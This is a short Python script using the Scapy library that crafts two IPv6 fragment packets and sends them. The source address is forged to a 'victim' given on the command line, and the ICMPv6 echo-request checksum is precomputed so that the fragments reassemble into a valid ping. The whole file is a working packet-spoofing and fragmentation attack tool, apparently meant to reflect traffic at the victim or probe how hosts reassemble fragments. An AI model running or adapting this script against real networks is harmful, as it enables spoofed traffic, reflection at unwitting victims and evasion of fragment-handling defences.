#!/usr/bin/python
from scapy.all import *
from binascii import unhexlify

# Victim address
sip=sys.argv[1]

# Target address
dip=sys.argv[2]

# IPv6 header
IP=IPv6(src=sip, dst=dip)

# Calculating Checksum 'CD'
payload=str(Raw("C"*8 + "D"*8))
echoReq=ICMPv6EchoRequest(data=payload)
csum=in6_chksum(58,IP/echoReq,str(echoReq))

# Payloads
payloadspoofed2=Raw("D"*8)
# Third and fourth bytes are the checksum with payload 'CD'
hexcksum = hex(csum).replace('0x','')
csumCD = unhexlify(hexcksum)
payloadspoofed1=Raw("\x80\x00"+ csumCD +"\x00\x00\x00\x00\x43\x43\x43\x43\x43\x43\x43\x43")

# Fragment headers
fragspoofed1=IPv6ExtHdrFragment(offset=0, m=1, id=12345, nh=58)
fragspoofed2=IPv6ExtHdrFragment(offset=2, m=0, id=12345, nh=58)

# Packets
packetspoofed1=IP/fragspoofed1/payloadspoofed1
packetspoofed2=IP/fragspoofed2/payloadspoofed2

# Sending packets
send(packetspoofed1)
send(packetspoofed2)

